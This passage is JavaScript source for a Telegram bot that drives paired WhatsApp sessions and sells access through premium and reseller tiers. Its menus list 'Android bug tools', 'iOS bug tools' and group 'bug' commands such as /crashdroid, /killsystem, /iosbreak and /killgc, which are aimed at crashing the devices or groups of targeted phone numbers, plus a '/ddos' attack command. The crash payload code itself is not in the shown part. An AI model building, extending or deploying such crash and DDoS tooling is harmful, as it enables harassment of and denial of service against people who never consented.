            if (activeBots[botData.token]) await activeBots[botData.token].stopPolling();
            db.tokens = db.tokens.filter(t => t.owner !== chatId);
            saveDB(db);
            const userAuthPath = `./Love/${chatId}`;
            if (fs.existsSync(userAuthPath)) fs.rmSync(userAuthPath, { recursive: true, force: true });
            S7.sendMessage(chatId, '✅ Your bot has been deleted.');
        });
        
        SYLoVe('addbot', async (msg) => {
            const chatId = msg.chat.id.toString();
            const args = msg.text.split(' ');
            const newToken = args[1];
            if (!newToken) return S7.sendMessage(chatId, '❌ Usage: /addbot <TOKEN>');
            let db = getDB();
            const userBots = db.tokens.filter(t => t.owner === chatId);
            if (userBots.length >= 1) return S7.sendMessage(chatId, '❌ You can only host 1 bot.');
            try {
                const tempBot = new SY(newToken, { polling: false });
                const botInfo = await tempBot.getMe();
                db.tokens.push({ token: newToken, owner: chatId, config: { channel: config.channel, group: config.group, logo: config.logo, botName: botInfo.first_name } });
                saveDB(db);
                startSYloveBot(newToken);
                S7.sendMessage(chatId, `✅ Bot Hosted!\n🤖 Name: ${botInfo.first_name}\n@${botInfo.username}`);
            } catch (e) { S7.sendMessage(chatId, '❌ Invalid Token.'); }
        });
        
        SYLoVe('checkmembership', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);
            if (isMember) S7.sendMessage(chatId, `✅ Membership verified! Try your command again.`, { parse_mode: 'HTML' });
            else S7.sendMessage(chatId, protectionMessage, { parse_mode: 'HTML', ...SYLovesButton });
        });
        
        SYLoVe('addtoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const newToken = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!newToken) return S7.sendMessage(chatId, 'Usage: /addtoken <token>');
            let db = getDB();
            if (db.tokens.find(t => t.token === newToken)) return S7.sendMessage(chatId, '❌ Token already connected.');
            const myBotsCount = db.tokens.filter(t => t.owner === userId).length;
            if (myBotsCount >= 5) return S7.sendMessage(chatId, '🚫 Bot limit reached! Max 5 bots.', { parse_mode: 'HTML' });
            try {
                const tempBot = new SY(newToken, { polling: false });
                const botInfo = await tempBot.getMe();
                db.tokens.push({ token: newToken, owner: userId });
                saveDB(db);
                startSYloveBot(newToken);
                S7.sendMessage(chatId, `✅ Token Connected\nBot: ${botInfo.first_name}\n@${botInfo.username}`);
            } catch (e) { S7.sendMessage(chatId, '❌ Invalid token.'); }
        });
        
        SYLoVe('reqpair', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!number) return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +919876543210');
            const cleanNumber = number.replace(/[^0-9]/g, '');
            let db = getDB();
            let currentBotTokenObj = db.tokens.find(t => activeBots[t.token] === S7);
            let ownerID = null;
            if (currentBotTokenObj) ownerID = currentBotTokenObj.owner;
            await StartLovingSY(chatId, cleanNumber, S7, false, ownerID);
        });
        
        SYLoVe('delpair', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!number) return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /delpair +919876543210');
            const cleanNumber = number.replace(/[^0-9]/g, '');
            const SYPaTH = `./Love/auth/${chatId}/${cleanNumber}`;
            if (fs.existsSync(SYPaTH)) {
                try { fs.rmSync(SYPaTH, { recursive: true, force: true }); S7.sendMessage(chatId, `🗑️ Session deleted for ${cleanNumber}.`, { parse_mode: 'HTML' }); } 
                catch (err) { S7.sendMessage(chatId, `❌ Error: ${err.message}`); }
            } else { S7.sendMessage(chatId, `⚠️ No session found for ${cleanNumber}.`, { parse_mode: 'HTML' }); }
        });
        
        SYLoVe('deltoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const delToken = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!delToken) return S7.sendMessage(chatId, 'Usage: /deltoken <token>');
            let db = getDB();
            const tokenObj = db.tokens.find(t => t.token === delToken);
            if (!tokenObj || tokenObj.owner !== userId) return S7.sendMessage(chatId, '❌ No connected token found.');
            db.tokens = db.tokens.filter(t => t.token !== delToken);
            saveDB(db);
            if (activeBots[delToken]) await activeBots[delToken].stopPolling();
            S7.sendMessage(chatId, '✅ Token deleted successfully.');
        });
        
        SYLoVe('mytoken', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            let db = getDB();
            const myTokens = db.tokens.filter(t => t.owner === userId);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (myTokens.length === 0) return S7.sendMessage(chatId, '❌ You have not added any tokens.');
            let text = '<b>Your Connected Bots</b>\n────────────────────\n\n';
            let count = 1;
            for (const item of myTokens) {
                try {
                    const bot = new SY(item.token, { polling: false });
                    const info = await bot.getMe();
                    text += `<b>${count}. ${info.first_name}</b>\n👤 @${info.username}\n🔑 <code>${item.token}</code>\n────────────────────\n\n`;
                    count++;
                } catch (err) {
                    text += `<b>${count}. ⚠️ Unknown Bot</b>\n🔑 <code>${item.token}</code>\n────────────────────\n\n`;
                    count++;
                }
            }
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });
        
        SYLoVe('addresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addresell ID');
            let db = getDB();
            if (db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is already a Reseller.');
            db.resellers.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} added as Reseller.`);
        });
        
        SYLoVe('delresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delresell ID');
            let db = getDB();
            if (!db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is not a Reseller.');
            db.resellers = db.resellers.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} removed from Resellers.`);
        });
        
        SYLoVe('listresell', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            let db = getDB();
            if (db.resellers.length === 0) return S7.sendMessage(chatId, 'No resellers found.');
            let text = 'Reseller List:\n\n';
            for (let i = 0; i < db.resellers.length; i++) {
                const id = db.resellers[i].toString();
                try {
                    const user = await S7.getChat(id);
                    const username = user.username ? `@${user.username} : ` : '';
                    text += `${i + 1}. ${username}<code>${id}</code>\n`;
                } catch (e) { text += `${i + 1}. <code>${id}</code>\n`; }
            }
            text += '\n──────────────────';
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });
        
        SYLoVe('addprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = chatId === config.adminId;
            const isReseller = db.resellers.includes(chatId);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!isOwner && !isReseller) return S7.sendMessage(chatId, notauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addprem ID');
            if (db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is already Premium.');
            db.premium.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `⭐ ID ${targetId} added to Premium.`);
        });
        
        SYLoVe('delprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = chatId === config.adminId;
            const isReseller = db.resellers.includes(chatId);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!isOwner && !isReseller) return S7.sendMessage(chatId, notauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delprem ID');
            if (!db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is not Premium.');
            db.premium = db.premium.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `🗑️ ID ${targetId} removed from Premium.`);
        });
        
        SYLoVe('broadcast', async (msg) => {
            const chatId = msg.chat.id.toString();
            if (chatId !== config.adminId.toString()) return S7.sendMessage(chatId, notauthorized);
            const broadcastMsg = msg.text.split(' ').slice(1).join(' ');
            if (!broadcastMsg) return S7.sendMessage(chatId, 'Usage: /broadcast <message>');
            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(chatId, 'No user database found.');
            const users = JSON.parse(fs.readFileSync(userFile));
            let success = 0, failed = 0;
            const statusMsg = await S7.sendMessage(chatId, `Broadcasting to ${users.length} users...`);
            for (const user of users) {
                try { await S7.sendMessage(user.id, broadcastMsg); success++; await delay(100); } 
                catch (err) { failed++; }
            }
            S7.editMessageText(`✅ Broadcast Done!\nSuccess: ${success}\nFailed: ${failed}`, { chat_id: chatId, message_id: statusMsg.message_id });
        });
        
        SYLoVe('listprem', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            let db = getDB();
            if (db.premium.length === 0) return S7.sendMessage(chatId, 'No premium users found.');
            let text = 'Premium List:\n\n';
            for (let i = 0; i < db.premium.length; i++) {
                const id = db.premium[i].toString();
                try {
                    const user = await S7.getChat(id);
                    const username = user.username ? `@${user.username} : ` : '';
                    text += `${i + 1}. ${username}<code>${id}</code>\n`;
                } catch (e) { text += `${i + 1}. <code>${id}</code>\n`; }
            }
            text += '\n──────────────────';
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });
        
        SYLoVe('listgc', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) return S7.sendMessage(chatId, '❌ No WhatsApp connected.');
            let output = `Your Connected WhatsApp Groups\n\n`;
            let totalGroups = 0, index = 1;
            for (const session of waSessions[chatId]) {
                const sock = session.sock, num = session.num;
                try {
                    const groupsObj = await sock.groupFetchAllParticipating();
                    const groups = Object.values(groupsObj);
                    if (groups.length === 0) continue;
                    output += `Number: ${num}\n━━━━━━━━━━━━━━━\n`;
                    for (const group of groups) {
                        const meta = await sock.groupMetadata(group.id);
                        output += `Group ${index++}\nName: ${meta.subject || 'Unnamed'}\nID: ${meta.id}\nMembers: ${meta.participants?.length || 0}\n──────────────\n\n`;
                        totalGroups++;
                    }
                } catch (err) { output += `Failed for ${num}: ${err.message}\n\n`; }
            }
            if (totalGroups === 0) return S7.sendMessage(chatId, 'No groups found.');
            output = `Your Groups (${totalGroups} total)\nConnected: ${waSessions[chatId].length}\n\n${output}`;
            if (output.length > 4000) {
                const filePath = `./Love/listgc_${chatId}.txt`;
                fs.writeFileSync(filePath, output.replace(/<[^>]*>/g, ''));
                return S7.sendDocument(chatId, filePath, { caption: `Groups (${totalGroups})` });
            }
            S7.sendMessage(chatId, output, { parse_mode: 'HTML' });
        });
        
        SYLoVe('state', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const value = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            if (value !== '0' && value !== '1') return S7.sendMessage(chatId, 'Usage: /state 0 | 1');
            let db = getDB();
            db.state = Number(value);
            saveDB(db);
            S7.sendMessage(chatId, value === '0' ? '✅ FREE MODE (All users allowed)' : '🔒 PREMIUM ONLY MODE');
        });
        
        SYLoVe('groupid', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) return S7.sendMessage(chatId, '❌ No WhatsApp connected. Use /reqpair first.');
            const args = msg.text.split(' ').slice(1);
            if (args.length === 0) return S7.sendMessage(chatId, 'Usage: /groupid <group link>');
            const inviteLink = args[0].trim();
            if (!inviteLink.includes('chat.whatsapp.com/')) return S7.sendMessage(chatId, 'Invalid WhatsApp group link.');
            const inviteCode = inviteLink.split('chat.whatsapp.com/')[1]?.trim();
            if (!inviteCode) return S7.sendMessage(chatId, 'Invalid link.');
            try {
                const sock = waSessions[chatId][0].sock;
                const result = await sock.groupAcceptInvite(inviteCode);
                if (!result?.gid) return S7.sendMessage(chatId, 'Failed.');
                const groupJid = result.gid;
                const meta = await sock.groupMetadata(groupJid);
                let infoText = `Group Info:\nName: ${meta.subject || 'No Name'}\nJID: ${groupJid}\nMembers: ${meta.participants?.length || '?'}`;
                await S7.sendMessage(chatId, infoText);
            } catch (err) { await S7.sendMessage(chatId, `Error: ${err.message}`); }
        });
        
        SYLoVe('listuser', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (msg.chat.id.toString() !== config.adminId) return S7.sendMessage(msg.chat.id, notauthorized);
            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(msg.chat.id, 'No users found.');
            const users = JSON.parse(fs.readFileSync(userFile));
            let list = 'User List:\n\n';
            users.forEach((u, i) => { list += `${i + 1}. ${u.name} (${u.id})\n`; });
            if (list.length > 4000) {
                const listPath = path.join(LoveDir, 'list.txt');
                fs.writeFileSync(listPath, list);
                S7.sendDocument(msg.chat.id, listPath);
            } else { S7.sendMessage(msg.chat.id, list); }
        });
        
        // ========== CALLBACK QUERY HANDLER ==========
        S7.on('callback_query', async (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const data = query.data;
            const userId = query.from.id;
            const name = query.from.first_name || "User";
            const uptime = getRuntime();
            const status = GetSYLoVe(userId.toString());
            
            const S7edit = (text, opts) => {
                S7.editMessageCaption(text, opts).catch((err) => {
                    if (!err.message.includes('message is not modified')) log('error', 'SYSTEM', err.message);
                });
            };
            
            // Broadcast confirmation
            if (data && data.startsWith('confirm_broadcast_')) {
                const broadcastMsg = S7.broadcastMsg;
                const users = S7.broadcastUsers;
                
                if (!broadcastMsg || !users) {
                    await S7.sendMessage(chatId, '❌ No broadcast message found.');
                    return;
                }
                
                await S7.deleteMessage(chatId, messageId).catch(() => {});
                
                const statusMsg = await S7.sendMessage(chatId, `📡 Sending broadcast to ${users.length} users...`);
                
                let success = 0;
                let failed = 0;
                
                for (const user of users) {
                    try {
                        await S7.sendMessage(user.id, 
                            `📢 BROADCAST\n\n${broadcastMsg}`, 
                            { parse_mode: 'HTML' }
                        );
                        success++;
                        await delay(100);
                    } catch (err) {
                        failed++;
                    }
                }
                
                await S7.editMessageText(
                    `✅ Broadcast Completed\n\nSent to: ${success} users\nFailed: ${failed} users`,
                    { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'HTML' }
                );
                
                delete S7.broadcastMsg;
                delete S7.broadcastUsers;
            }
            
            if (data === 'cancel_broadcast') {
                await S7.deleteMessage(chatId, messageId).catch(() => {});
                await S7.sendMessage(chatId, '❌ Broadcast cancelled.');
                delete S7.broadcastMsg;
                delete S7.broadcastUsers;
            }
            
            if (data === 'force_join_check') {
                const joined = await checkForceChannels(S7, userId);
                if (joined) {
                    S7.deleteMessage(chatId, messageId).catch(() => {});
                    S7.sendMessage(chatId, `✅ Thanks for joining! Use /start to access the bot.`, { parse_mode: 'HTML' });
                } else {
                    S7.answerCallbackQuery(query.id, { text: '❌ Join all channels first!', show_alert: true });
                }
            }
            
                        // Terms of Service callbacks
            if (data === 'tos_accept') {
                agreeTos(userId);
                await S7.deleteMessage(chatId, messageId).catch(() => {});
                
                const love = userId.toString();
                const status = GetSYLoVe(love);
                const captionText = buildHomeCaption(name, uptime, status, botConfig.botName);

                S7.sendPhoto(chatId, botConfig.logo, {
                    caption: captionText,
                    parse_mode: 'HTML',
                    ...MainMenu
                }).catch(() => {
                    S7.sendMessage(chatId, captionText, { parse_mode: 'HTML', ...MainMenu });
                });
            }

            if (data === 'tos_decline') {
                declineTos(userId);
                await S7.deleteMessage(chatId, messageId).catch(() => {});
                await S7.sendMessage(chatId, 
                    `❌ ACCESS DENIED\n\nYou have declined the Terms of Service.\nYou cannot use this bot without agreeing to the terms.\n\n📩 Contact @certifiedloner_16 if you have questions.`,
                    { parse_mode: 'HTML' }
                );
            }
            
            if (data === 'check_membership') {
                const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);
                if (isMember) {
                    S7.deleteMessage(chatId, messageId).catch(() => {});
                    S7.sendMessage(chatId, `✅ Verified! Try your command again.`, { parse_mode: 'HTML' });
                } else {
                    S7.answerCallbackQuery(query.id, { text: '❌ Not joined!', show_alert: true });
                }
            }
            
            const backBtn = { reply_markup: { inline_keyboard: [[{ text: '🔙 ʙᴀᴄᴋ', callback_data: 'back_submenu' }]] } };

            if (data === 'back_submenu') {
                await S7.deleteMessage(chatId, messageId).catch(() => {});
                S7.answerCallbackQuery(query.id).catch(() => {});
            }

            if (data === 'main_menu') {
                const captionText = buildHomeCaption(name, uptime, status, botConfig.botName);
                S7edit(captionText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', ...MainMenu });
            }
            
            if (data === 'android_menu') {
                S7.sendMessage(chatId, buildCmdPage('🐛', 'ᴀɴᴅʀᴏɪᴅ ʙᴜɢ ᴛᴏᴏʟs', [
                    '/crashjam +234 1',
                    '/trashsystem +234 1',
                    '/crashdroid +234 1',
                    '/killsystem +234 1',
                    '/goneforce +234',
                    '/familyproblem +234',
                    '/r9x +234 1'
                ]), { parse_mode: 'HTML', ...backBtn });
            }
            
            if (data === 'ios_menu') {
                S7.sendMessage(chatId, buildCmdPage('🍎', 'ɪᴏs ʙᴜɢ ᴛᴏᴏʟs', [
                    '/hidenseek +234 1',
                    '/iosinvisible +234 1',
                    '/iosbreak +234'
                ]), { parse_mode: 'HTML', ...backBtn });
            }
            
            if (data === 'group_menu') {
                S7.sendMessage(chatId, buildCmdPage('👥', 'ɢʀᴏᴜᴘ ʙᴜɢ ᴛᴏᴏʟs', [
                    '/trashsysgp groupid 1',
                    '/xgroup groupid 1',
                    '/killgc groupid 1',
                    '/groupfriz groupid 1',
                    '/gcpromote groupid userid',
                    '/gcdemote groupid userid',
                    '/gcban groupid userid',
                    '/gcadd groupid userid',
                    '/listgc',
                    '/groupid https://chat.whatsapp.com/xxx'
                ]), { parse_mode: 'HTML', ...backBtn });
            }
            
            if (data === 'ddos_menu') {
                S7.sendMessage(chatId, buildCmdPage('💥', 'ᴅᴅᴏs ᴀᴛᴛᴀᴄᴋ ᴛᴏᴏʟs', [
                    '/ddos https://example.com 60'
                ]), { parse_mode: 'HTML', ...backBtn });
            }
            
            if (data === 'misc_menu') {
                S7.sendMessage(chatId, buildCmdPage('⚙️', 'ᴍɪsᴄ ᴛᴏᴏʟs', [
                    '/reqpair +234',
                    '/delpair +234',
                    '/addprem userid',
                    '/delprem userid',
                    '/addresell userid',
                    '/delresell userid',
                    '/addtoken token',
                    '/deltoken token',
                    '/listprem',
                    '/listresell',
                    '/listuser',
                    '/mytoken',
                    '/goneforce +234',
                    '/familyproblem +234',
                    '/iosbreak +234'
                ]), { parse_mode: 'HTML', ...backBtn });
            }
            
            // Command suggestion callbacks
            const cmdExamples = {
                'cmd_crashjam': '/crashjam +234 1',
                'cmd_trashsystem': '/trashsystem +234 1',
                'cmd_crashdroid': '/crashdroid +234 1',
                'cmd_killsystem': '/killsystem +234 1',
                'cmd_hidenseek': '/hidenseek +234 1',
                'cmd_iosinvisible': '/iosinvisible +234 1',
                'cmd_trashsysgp': '/trashsysgp 1234567890@g.us 1',
                'cmd_xgroup': '/xgroup 1234567890@g.us 1',
                'cmd_killgc': '/killgc 1234567890@g.us 1',
                'cmd_groupfriz': '/groupfriz 1234567890@g.us 1',
                'cmd_gcpromote': '/gcpromote 1234567890@g.us 919876543210',
                'cmd_gcdemote': '/gcdemote 1234567890@g.us 919876543210',
                'cmd_gcban': '/gcban 1234567890@g.us 919876543210',
                'cmd_gcadd': '/gcadd 1234567890@g.us 919876543210',
                'cmd_listgc': '/listgc',
                'cmd_groupid': '/groupid https://chat.whatsapp.com/abc123',
                'cmd_ddos': '/ddos https://example.com 60',
                'cmd_reqpair': '/reqpair +234',
                'cmd_delpair': '/delpair +234',
                'cmd_addprem': '/addprem 234',
                'cmd_delprem': '/delprem 234',
                'cmd_addresell': '/addresell 234',
                'cmd_delresell': '/delresell 234',
                'cmd_addtoken': '/addtoken YOUR_BOT_TOKEN',
                'cmd_deltoken': '/deltoken YOUR_BOT_TOKEN',
                'cmd_listprem': '/listprem',
                'cmd_listresell': '/listresell',
                'cmd_listuser': '/listuser',
                'cmd_mytoken': '/mytoken',
                'cmd_goneforce': '/goneforce +234',
                'cmd_familyproblem': '/familyproblem +234',
                'cmd_iosbreak': '/iosbreak +234'
            };
            
            if (cmdExamples[data]) {
                S7.answerCallbackQuery(query.id, { text: `Example: ${cmdExamples[data]}`, show_alert: true });
            }
        });
        
    } catch (err) {
        log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
    }
}

// Start SYLove Bot
startSYloveBot(config.mainToken);

// Start Extra Bots
const db = getDB();
if (db.tokens && db.tokens.length > 0) {
    db.tokens.forEach(obj => { startSYloveBot(obj.token); });
} else {
    log('info', null, 'No extra bots found in database.');
}